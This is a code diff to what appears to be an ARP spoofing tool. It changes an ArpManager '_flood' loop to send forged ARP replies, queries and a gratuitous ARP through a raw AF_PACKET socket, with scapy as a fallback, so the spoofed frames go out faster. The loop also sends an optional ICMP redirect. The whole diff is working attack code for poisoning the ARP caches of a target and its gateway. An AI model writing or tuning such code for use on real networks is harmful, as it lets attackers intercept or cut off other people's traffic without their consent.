@@ -24,6 +24,7 @@ import time
 
 from core.netutil import valid_ip
 from core.osutil import IS_WINDOWS as _IS_WINDOWS
+from network.rawsock import RawL2Sender
 
 try:
     from scapy.all import ARP, Ether, sendp, srp
@@ -317,18 +318,31 @@ class ArpManager:
                 op=2, hwsrc=my_mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway
             )
 
-            while not stop_evt.is_set():
-                try:
-                    sendp(pkt_to_target_r, iface=iface, verbose=False)
-                    sendp(pkt_to_target_q, iface=iface, verbose=False)
-                    sendp(pkt_to_gw_r, iface=iface, verbose=False)
-                    sendp(pkt_to_gw_q, iface=iface, verbose=False)
-                    sendp(pkt_garp, iface=iface, verbose=False)
-                    if pkt_redirect:
-                        send(pkt_redirect, verbose=False, count=2)  # Double strike
-                except Exception:
-                    pass
-                stop_evt.wait(self.ARP_INTERVAL)
+            # STEP 4: scapy builds, a raw AF_PACKET socket sends. Serialise the
+            # five static L2 frames once; blast the bytes each iteration. Falls
+            # back to scapy sendp when the raw socket isn't available (non-root)
+            # or a send fails mid-loop, so behaviour is never worse.
+            l2_frames = [pkt_to_target_r, pkt_to_target_q, pkt_to_gw_r, pkt_to_gw_q, pkt_garp]
+            raw = RawL2Sender(iface)
+            raw_bytes = [bytes(p) for p in l2_frames] if raw.available else []
+
+            try:
+                while not stop_evt.is_set():
+                    try:
+                        if raw.available:
+                            for i, frame in enumerate(raw_bytes):
+                                if not raw.send(frame):
+                                    sendp(l2_frames[i], iface=iface, verbose=False)
+                        else:
+                            for pkt in l2_frames:
+                                sendp(pkt, iface=iface, verbose=False)
+                        if pkt_redirect:
+                            send(pkt_redirect, verbose=False, count=2)  # L3 (routed) — scapy
+                    except Exception:
+                        pass
+                    stop_evt.wait(self.ARP_INTERVAL)
+            finally:
+                raw.close()
 
         threading.Thread(target=_flood, daemon=True, name=f"arp_flood_{ip}").start()
 
